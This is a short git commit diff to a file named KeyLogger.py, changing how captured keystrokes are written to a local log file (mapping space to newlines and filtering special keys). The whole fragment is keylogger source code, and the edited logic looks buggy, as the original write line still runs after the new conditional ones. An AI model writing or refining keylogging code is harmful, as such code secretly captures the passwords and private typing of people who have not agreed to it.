88dedd8d7785290a5785fd47a007b43d9a0f5847
notChewy1324 <40218645+notChewy1324@users.noreply.github.com>
2020-05-06 22:46:57 -0400

    Updated Logic

--- KeyLogger.py
+++ KeyLogger.py
@@ -19,6 +19,11 @@ def on_press(key):
 def write_file(keys):
     with open("key_log.txt", "a") as f:
         for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
             f.write(str(key))
 
 def on_release(key):
